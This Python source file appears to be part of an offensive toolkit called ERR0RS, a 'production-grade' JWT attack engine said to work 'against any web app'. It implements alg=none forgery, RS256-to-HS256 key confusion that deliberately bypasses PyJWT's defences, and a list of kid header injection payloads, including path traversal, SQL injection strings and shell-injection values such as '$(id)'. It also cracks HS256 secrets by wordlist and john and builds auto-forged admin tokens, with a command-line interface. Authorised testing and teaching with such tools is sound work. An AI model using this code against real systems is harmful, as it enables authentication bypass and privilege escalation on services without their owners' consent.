"""
ERR0RS JWT Manipulation Engine
================================
Production-grade JWT abuse module. Works against any web app, validates
on Juice Shop's 5 JWT-related challenges.

Capabilities:
  • decode()             — parse any JWT into header/claims/signature
  • try_none_algorithm() — alg=none bypass (CVE-2015-9235 family)
  • try_alg_confusion()  — RS256 → HS256 with public key as HMAC secret
  • try_kid_injection()  — kid header path traversal / SQLi payloads
  • crack_hs256()        — offline secret cracking via curated wordlist + john
  • forge()              — mint a new token with arbitrary claims
  • auto_attack()        — try all techniques, return first that works

Philosophy:
  This module DOES NOT call out to the network on its own.
  It builds attack payloads. The orchestrator is responsible for
  delivering them and observing responses. This separation keeps
  the engine pure, testable, and reusable across protocols.

Usage:
    from src.tools.auth.jwt_breaker import JWTBreaker

    jb = JWTBreaker()
    parsed = jb.decode("eyJhbGc...")
    forged = jb.try_none_algorithm(token, modify={"role": "admin"})
    secret = jb.crack_hs256(token)
    if secret:
        admin_token = jb.forge(secret, {"email": "admin@x.com", "role": "admin"})

Author: Gary Holden Schneider (Eros) | Sprint 01
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional


# ── Isolated PyJWT import (avoid Gehirn jwt 1.4.0 collision) ──────────────

def _load_pyjwt():
    """
    On systems where 'jwt' (Gehirn) is also installed, plain `import jwt`
    grabs the wrong package. Force-load PyJWT 2.x from the standard distro
    location and return the module object.
    """
    candidates = [
        "/usr/lib/python3/dist-packages/jwt/__init__.py",
        "/usr/lib/python3.13/dist-packages/jwt/__init__.py",
        "/usr/lib/python3.12/dist-packages/jwt/__init__.py",
        "/usr/lib/python3.11/dist-packages/jwt/__init__.py",
    ]
    for path in candidates:
        if not os.path.exists(path):
            continue
        spec = importlib.util.spec_from_file_location("_err0rs_pyjwt", path)
        module = importlib.util.module_from_spec(spec)
        sys.modules.setdefault("_err0rs_pyjwt", module)
        try:
            spec.loader.exec_module(module)
        except Exception:
            continue
        if hasattr(module, "encode") and hasattr(module, "decode"):
            return module
    # Fall back to standard import (works if no conflict)
    import jwt as _jwt  # type: ignore
    if not hasattr(_jwt, "encode"):
        raise ImportError(
            "PyJWT 2.x not found. Install with `pip install PyJWT --break-system-packages`."
        )
    return _jwt


pyjwt = _load_pyjwt()


# ── Data structures ───────────────────────────────────────────────────────

@dataclass
class ParsedJWT:
    """A decoded JWT, no verification performed."""
    header:    dict
    claims:    dict
    signature: bytes               # raw signature bytes
    raw:       str                 # original token
    parts:     tuple[str, str, str] = field(repr=False)

    @property
    def alg(self) -> str:
        return self.header.get("alg", "")

    @property
    def kid(self) -> Optional[str]:
        return self.header.get("kid")


@dataclass
class AttackResult:
    """Outcome of a single attack attempt."""
    technique:   str
    success:     bool
    forged_token: Optional[str] = None
    secret:      Optional[str] = None
    detail:      str = ""

    def __bool__(self) -> bool:
        return self.success


# ── Base64-url helpers ────────────────────────────────────────────────────

def _b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64u_decode(s: str) -> bytes:
    # Pad to multiple of 4 — JWT strips '=' but base64 needs them
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode((s + padding).encode("ascii"))


# ── The breaker ───────────────────────────────────────────────────────────

class JWTBreaker:
    """
    Stateless JWT attack engine. Methods are pure functions of their inputs
    (with the exception of crack_hs256() which does I/O and subprocess work).

    Construct once, reuse across many tokens.
    """

    DEFAULT_WORDLIST = Path(__file__).parent / "jwt_secrets.txt"
    ROCKYOU = Path("/usr/share/wordlists/rockyou.txt")

    # HMAC algorithms we can sign manually (used for the empty-key bypass in
    # forge(); PyJWT refuses an empty HMAC key, which the kid=/dev/null
    # technique requires).
    _HS_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

    def __init__(self, *, wordlist: Optional[Path] = None,
                 john_path: Optional[str] = None,
                 hashcat_path: Optional[str] = None):
        self.wordlist = Path(wordlist) if wordlist else self.DEFAULT_WORDLIST
        if not self.wordlist.exists():
            raise FileNotFoundError(f"Wordlist not found: {self.wordlist}")
        self.john_path    = john_path    or shutil.which("john")
        self.hashcat_path = hashcat_path or shutil.which("hashcat")

    # ── decode ────────────────────────────────────────────────────────────

    def decode(self, token: str) -> ParsedJWT:
        """
        Parse a JWT into its components. Does NO signature verification.
        Raises ValueError on malformed input.
        """
        if not isinstance(token, str) or not token:
            raise ValueError("Token must be a non-empty string")
        token = token.strip()
        # Strip "Bearer " prefix if present
        if token.lower().startswith("bearer "):
            token = token[7:].strip()

        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError(f"Token must have 3 parts, got {len(parts)}")
        h_b64, p_b64, s_b64 = parts

        try:
            header_bytes  = _b64u_decode(h_b64)
            payload_bytes = _b64u_decode(p_b64)
            sig_bytes     = _b64u_decode(s_b64) if s_b64 else b""
        except Exception as e:
            raise ValueError(f"Base64 decode failed: {e}")

        try:
            header  = json.loads(header_bytes)
            claims  = json.loads(payload_bytes)
        except json.JSONDecodeError as e:
            raise ValueError(f"JSON decode failed: {e}")

        if not isinstance(header, dict) or not isinstance(claims, dict):
            raise ValueError("Header and claims must be JSON objects")

        return ParsedJWT(header=header, claims=claims, signature=sig_bytes,
                          raw=token, parts=(h_b64, p_b64, s_b64))

    # ── forge (with known secret) ─────────────────────────────────────────

    def forge(self, secret: str, claims: dict, *,
              alg: str = "HS256",
              extra_header: Optional[dict] = None) -> str:
        """
        Mint a new token with the given claims, signed by `secret`.
        Defaults to HS256. extra_header lets you set kid/typ/etc.
        """
        if not isinstance(claims, dict):
            raise TypeError("claims must be a dict")
        headers = dict(extra_header) if extra_header else None

        # PyJWT 2.10+ raises InvalidKeyError on an empty HMAC key as a
        # defense-in-depth measure. The kid=/dev/null technique REQUIRES a
        # token signed with an EMPTY secret (a vulnerable server reads
        # /dev/null → empty key), so for that specific case we sign by hand —
        # the same bypass philosophy documented in try_alg_confusion().
        # Every non-empty case still goes through PyJWT unchanged.
        if secret == "" and alg.upper() in self._HS_HASHES:
            return self._sign_hs_empty(claims, alg=alg, extra_header=extra_header)

        token = pyjwt.encode(claims, secret, algorithm=alg, headers=headers)
        # PyJWT returns str on 2.x; older versions returned bytes
        return token if isinstance(token, str) else token.decode("ascii")

    @staticmethod
    def _b64url(data: bytes) -> str:
        """URL-safe base64 without padding — the JWT segment encoding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _sign_hs_empty(self, claims: dict, *, alg: str = "HS256",
                       extra_header: Optional[dict] = None) -> str:
        """Mint an HS* JWT signed with an EMPTY HMAC key.

        PyJWT refuses an empty HMAC key; the kid=/dev/null attack depends on
        exactly that token. We build it directly —
        b64url(header).b64url(payload).b64url(HMAC(b"", signing_input)) —
        mirroring PyJWT's own layout, with only the key differing.
        """
        hash_fn = self._HS_HASHES[alg.upper()]
        header = {"typ": "JWT", "alg": alg}
        if extra_header:
            header.update(extra_header)
        seg_h = self._b64url(json.dumps(header, separators=(",", ":")).encode())
        seg_p = self._b64url(json.dumps(claims, separators=(",", ":")).encode())
        signing_input = f"{seg_h}.{seg_p}".encode("ascii")
        signature = hmac.new(b"", signing_input, hash_fn).digest()
        return f"{seg_h}.{seg_p}.{self._b64url(signature)}"

    # ── alg=none attack ───────────────────────────────────────────────────

    def try_none_algorithm(self, token: str,
                           modify: Optional[dict] = None) -> AttackResult:
        """
        Build an alg=none variant of the token with optionally modified claims.
        Tests the classic CVE-2015-9235 family of bugs where a server
        accepts unsigned tokens.

        Returns the forged token. Caller must deliver it and observe success.
        """
        try:
            parsed = self.decode(token)
        except ValueError as e:
            return AttackResult("none_alg", False, detail=f"decode failed: {e}")

        new_header = dict(parsed.header)
        new_header["alg"] = "none"
        new_header.pop("typ", None)  # some servers reject without typ; some reject WITH it
        new_header["typ"] = "JWT"

        new_claims = dict(parsed.claims)
        if modify:
            new_claims.update(modify)

        h = _b64u_encode(json.dumps(new_header,  separators=(",", ":")).encode())
        p = _b64u_encode(json.dumps(new_claims, separators=(",", ":")).encode())
        forged = f"{h}.{p}."   # empty signature

        return AttackResult(
            technique="none_alg",
            success=True,
            forged_token=forged,
            detail=(f"alg=none token built. Original alg: {parsed.alg}. "
                    f"Modified claims: {list(modify.keys()) if modify else []}"),
        )

    # ── kid header injection ──────────────────────────────────────────────

    KID_INJECTIONS = [
        "../../../../../../dev/null",        # if server reads kid as path
        "../../../../etc/passwd",
        "/dev/null",
        "key1' UNION SELECT 'AAAA",          # SQLi if kid is queried in DB
        "key1' OR '1'='1",
        "../../../../../../../../tmp/x",
        "x' UNION SELECT 'a",
        "|id",                                # if kid is shell-interpolated
        "$(id)",
        "`id`",
        "../../../../../../var/log/access.log",
    ]

    def try_kid_injection(self, token: str,
                          modify: Optional[dict] = None) -> list[AttackResult]:
        """
        Build a battery of forged tokens with `kid` headers that try
        path traversal, SQLi, and command injection in the kid value.

        Each result includes the forged token AND the secret used —
        the attacker chooses a secret known to them (e.g. the contents
        of /dev/null = empty string), forges a token with that secret,
        and points kid at /dev/null. Server reads kid → opens /dev/null
        → empty key → server uses empty string as HMAC secret → match.
        """
        try:
            parsed = self.decode(token)
        except ValueError as e:
            return [AttackResult("kid_injection", False, detail=f"decode failed: {e}")]

        new_claims = dict(parsed.claims)
        if modify:
            new_claims.update(modify)

        results = []
        for kid_value in self.KID_INJECTIONS:
            # The /dev/null trick: empty file → empty secret
            if "dev/null" in kid_value:
                secret = ""
                technique_detail = (
                    f"kid points to /dev/null; attacker forges with empty secret. "
                    f"Server reads kid → opens /dev/null → empty bytes → "
                    f"HMAC with empty key → match."
                )
            else:
                # SQLi: server returns the literal string after UNION
                secret = "AAAA" if "AAAA" in kid_value else "a"
                technique_detail = (
                    f"kid contains injection; if vulnerable, server's lookup "
                    f"yields {secret!r}. Attacker forges token with that secret."
                )

            try:
                forged = self.forge(secret, new_claims,
                                     alg="HS256",
                                     extra_header={"kid": kid_value})
            except Exception as e:
                results.append(AttackResult("kid_injection", False,
                                              detail=f"forge failed: {e}"))
                continue

            results.append(AttackResult(
                technique="kid_injection",
                success=True,
                forged_token=forged,
                secret=secret,
                detail=f"kid={kid_value!r} | {technique_detail}",
            ))

        return results

    # ── alg confusion (RS256 → HS256 with pubkey as secret) ───────────────

    def try_alg_confusion(self, token: str, public_key_pem: str,
                          modify: Optional[dict] = None) -> AttackResult:
        """
        Classic asymmetric-to-symmetric confusion attack (CVE-2016-10555 family).

        If the server uses jwt.verify(token, key) without specifying the
        algorithm, an attacker can:
          1. Take the server's RS256 PUBLIC key (often discoverable: /jwks,
             /.well-known/openid-configuration, etc.)
          2. Forge an HS256 token using that public key as the HMAC secret
          3. Server tries to verify — sees alg=HS256 → uses the key as HMAC →
             signature matches → token accepted as valid

        Note: We HMAC the public key bytes manually, because PyJWT 2.x
        refuses to use a PEM-formatted asymmetric key as an HMAC secret
        (a defense-in-depth check). Real attackers bypass that — so do we.
        """
        try:
            parsed = self.decode(token)
        except ValueError as e:
            return AttackResult("alg_confusion", False, detail=f"decode failed: {e}")

        new_claims = dict(parsed.claims)
        if modify:
            new_claims.update(modify)

        # Build the token by hand so PyJWT's anti-confusion defense doesn't
        # block us. The whole point of this attack is that we WANT to use
        # the public key as an HMAC secret.
        new_header = {"alg": "HS256", "typ": "JWT"}
        if parsed.kid:
            new_header["kid"] = parsed.kid

        h_b64 = _b64u_encode(json.dumps(new_header,  separators=(",", ":")).encode())
        p_b64 = _b64u_encode(json.dumps(new_claims, separators=(",", ":")).encode())
        signing_input = f"{h_b64}.{p_b64}".encode("ascii")

        # Use the PEM key bytes as the HMAC secret (the actual attack)
        key_bytes = public_key_pem.encode("ascii") if isinstance(public_key_pem, str) else public_key_pem
        sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
        s_b64 = _b64u_encode(sig)

        forged = f"{h_b64}.{p_b64}.{s_b64}"

        return AttackResult(
            technique="alg_confusion",
            success=True,
            forged_token=forged,
            secret=public_key_pem,
            detail=(f"RS256→HS256 confusion forged. Original alg: {parsed.alg}. "
                    f"HMAC secret = public key bytes ({len(public_key_pem)} chars)."),
        )

    # ── HS256 secret cracking ─────────────────────────────────────────────

    def crack_hs256(self, token: str, *,
                    wordlist: Optional[Path] = None,
                    timeout: int = 60,
                    use_john: bool = False) -> Optional[str]:
        """
        Try every secret in `wordlist` (default = our curated 600-word list,
        plus optional rockyou.txt fallback) and return the matching secret
        or None.

        Pure Python by default — the curated list is ~600 entries which
        runs in well under 1 second. For longer wordlists we shell out to
        john if available and `use_john=True`.

        Returns the cracked secret or None.
        """
        try:
            parsed = self.decode(token)
        except ValueError:
            return None

        if parsed.alg not in ("HS256", "HS384", "HS512"):
            return None

        # Reconstruct the signing input
        h_b64, p_b64, s_b64 = parsed.parts
        signing_input = f"{h_b64}.{p_b64}".encode("ascii")
        target_sig    = parsed.signature

        digest_mod = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }[parsed.alg]

        wl = Path(wordlist) if wordlist else self.wordlist

        # Pure-Python fast path
        secret = self._crack_python(wl, signing_input, target_sig, digest_mod)
        if secret is not None:
            return secret

        # Optional john fallback for big wordlists
        if use_john and self.john_path:
            return self._crack_john(token, wl, timeout)

        return None

    @staticmethod
    def _crack_python(wordlist: Path, signing_input: bytes,
                      target_sig: bytes, digest_mod) -> Optional[str]:
        """Pure-Python HMAC brute against a wordlist file."""
        with open(wordlist, "rb") as f:
            for line in f:
                # Strip newlines but PRESERVE leading/trailing spaces
                # (a few real-world secrets actually have spaces)
                secret = line.rstrip(b"\r\n")
                if not secret:
                    continue
                computed = hmac.new(secret, signing_input, digest_mod).digest()
                if hmac.compare_digest(computed, target_sig):
                    try:
                        return secret.decode("utf-8")
                    except UnicodeDecodeError:
                        return secret.decode("latin-1")
        return None

    def _crack_john(self, token: str, wordlist: Path, timeout: int) -> Optional[str]:
        """Shell out to john for big-wordlist HS256 cracking."""
        if not self.john_path:
            return None
        with tempfile.NamedTemporaryFile("w", suffix=".jwt", delete=False) as f:
            f.write(token + "\n")
            hashfile = f.name
        try:
            subprocess.run(
                [self.john_path, f"--wordlist={wordlist}",
                 "--format=HMAC-SHA256", hashfile],
                capture_output=True, timeout=timeout, check=False,
            )
            r = subprocess.run(
                [self.john_path, "--show", "--format=HMAC-SHA256", hashfile],
                capture_output=True, text=True, timeout=10, check=False,
            )
            for line in r.stdout.splitlines():
                if ":" in line and not line.startswith("0 password"):
                    return line.split(":", 1)[1].split(":", 1)[0]
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return None
        finally:
            try: os.unlink(hashfile)
            except OSError: pass
        return None

    # ── auto_attack: try everything ───────────────────────────────────────

    def auto_attack(self, token: str, *,
                    target_claims: Optional[dict] = None,
                    public_key: Optional[str] = None,
                    crack_timeout: int = 30) -> list[AttackResult]:
        """
        Run every attack technique against the token. Returns a list of
        AttackResults — caller picks which to deliver against the target.

        This is what the orchestrator calls when it sees a JWT on the wire.
        """
        target_claims = target_claims or {"role": "admin", "isAdmin": True}
        results: list[AttackResult] = []

        # 1. alg=none — fastest test, often works on legacy code
        results.append(self.try_none_algorithm(token, modify=target_claims))

        # 2. kid injection — multiple variants
        results.extend(self.try_kid_injection(token, modify=target_claims))

        # 3. HS256 secret cracking
        secret = self.crack_hs256(token, timeout=crack_timeout)
        if secret is not None:
            try:
                parsed = self.decode(token)
                claims = dict(parsed.claims); claims.update(target_claims)
                forged = self.forge(secret, claims,
                                     alg=parsed.alg or "HS256")
                results.append(AttackResult(
                    technique="hs256_crack",
                    success=True,
                    forged_token=forged,
                    secret=secret,
                    detail=f"Cracked secret: {secret!r} via curated wordlist",
                ))
            except Exception as e:
                results.append(AttackResult("hs256_crack", False,
                                              detail=f"forge after crack failed: {e}"))
        else:
            results.append(AttackResult("hs256_crack", False,
                                          detail="No match in curated wordlist"))

        # 4. alg confusion — only if caller provided a public key
        if public_key:
            results.append(self.try_alg_confusion(token, public_key,
                                                    modify=target_claims))

        return results


# ── Module-level convenience ──────────────────────────────────────────────

_default_breaker: Optional[JWTBreaker] = None

def get_breaker() -> JWTBreaker:
    """Lazy singleton — most callers don't need to construct their own."""
    global _default_breaker
    if _default_breaker is None:
        _default_breaker = JWTBreaker()
    return _default_breaker


# ── CLI entry point ───────────────────────────────────────────────────────

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="python3 -m src.tools.auth.jwt_breaker",
        description="ERR0RS JWT manipulation engine",
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    pdec = sub.add_parser("decode", help="Decode a JWT")
    pdec.add_argument("token")

    pnone = sub.add_parser("none", help="Build an alg=none variant")
    pnone.add_argument("token")
    pnone.add_argument("--claim", action="append", default=[],
                       help="key=value (repeatable)")

    pkid = sub.add_parser("kid", help="Generate kid-injection payloads")
    pkid.add_argument("token")
    pkid.add_argument("--claim", action="append", default=[])

    pcrack = sub.add_parser("crack", help="Crack HS256 secret")
    pcrack.add_argument("token")
    pcrack.add_argument("--wordlist", default=None)

    pauto = sub.add_parser("auto", help="Try every technique")
    pauto.add_argument("token")
    pauto.add_argument("--claim", action="append", default=[])
    pauto.add_argument("--public-key", help="PEM file for alg-confusion")

    args = p.parse_args()

    def parse_claims(items: list[str]) -> dict:
        out = {}
        for item in items:
            if "=" not in item:
                continue
            k, v = item.split("=", 1)
            # Try to coerce booleans / ints
            if v.lower() in ("true", "false"):
                v = v.lower() == "true"
            elif v.isdigit():
                v = int(v)
            out[k] = v
        return out

    jb = JWTBreaker()

    if args.cmd == "decode":
        parsed = jb.decode(args.token)
        print(json.dumps({
            "header": parsed.header,
            "claims": parsed.claims,
            "alg":    parsed.alg,
            "kid":    parsed.kid,
            "sig_len_bytes": len(parsed.signature),
        }, indent=2))

    elif args.cmd == "none":
        r = jb.try_none_algorithm(args.token, modify=parse_claims(args.claim))
        print(json.dumps({"technique": r.technique, "forged": r.forged_token,
                          "detail": r.detail}, indent=2))

    elif args.cmd == "kid":
        rs = jb.try_kid_injection(args.token, modify=parse_claims(args.claim))
        print(json.dumps([{"forged": r.forged_token, "secret": r.secret,
                           "detail": r.detail} for r in rs], indent=2))

    elif args.cmd == "crack":
        wl = Path(args.wordlist) if args.wordlist else None
        secret = jb.crack_hs256(args.token, wordlist=wl)
        if secret is not None:
            print(json.dumps({"cracked": True, "secret": secret}, indent=2))
        else:
            print(json.dumps({"cracked": False}, indent=2))

    elif args.cmd == "auto":
        pubkey = open(args.public_key).read() if args.public_key else None
        results = jb.auto_attack(args.token,
                                  target_claims=parse_claims(args.claim),
                                  public_key=pubkey)
        out = [{"technique": r.technique, "success": r.success,
                "forged": r.forged_token, "secret": r.secret,
                "detail": r.detail} for r in results]
        print(json.dumps(out, indent=2))


if __name__ == "__main__":
    _cli()
